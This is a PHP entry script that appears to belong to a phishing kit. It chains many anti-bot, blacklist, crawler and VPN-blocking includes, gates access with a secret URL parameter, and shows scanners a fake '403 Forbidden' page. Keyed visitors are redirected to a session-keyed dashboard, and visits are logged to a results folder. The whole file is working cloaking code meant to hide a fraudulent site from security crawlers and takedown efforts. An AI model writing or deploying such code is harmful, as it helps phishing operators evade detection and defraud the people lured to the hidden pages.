<?php 
session_start();
require 'main.php';
require_once 'blocker.php';
include('detects.php');
include('blockers.php');
include 'bots/anti1.php';
include 'bots/anti2.php';
include 'bots/anti3.php';
include 'bots/anti4.php';
include 'bots/anti5.php';
include 'bots/anti6.php';
include 'bots/anti7.php';
include 'bots/anti8.php';
include'anti/IP-BlackList.php';  
include'anti/Bot-Crawler.php';
include'anti/Bot-Spox.php';
include'anti/blacklist.php';
include'anti/new.php';
include'anti/Dila_DZ.php';
if(filesize("config/antibot.ini") == 1) {
}else{
require_once("antibot.php");
}
if($onetime == "on") {
	require_once 'onetime.php';
}
if($block_vpn == "on") {
    require_once 'proxyblock.php';
}
if($site_param_on == "on") {
    $secret = $site_parameter;
    $password = $_GET[$secret];
    if(!isset($password)) {
        $save = fopen("../rs/bot.txt","a+");
        //header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
    }else{
        $_SESSION['key'] = $key;
    }
}
$_SESSION['key'] = $key;
header("location: dashboard?key=$key");
$save = fopen("../rs/bot.txt","a+");
?>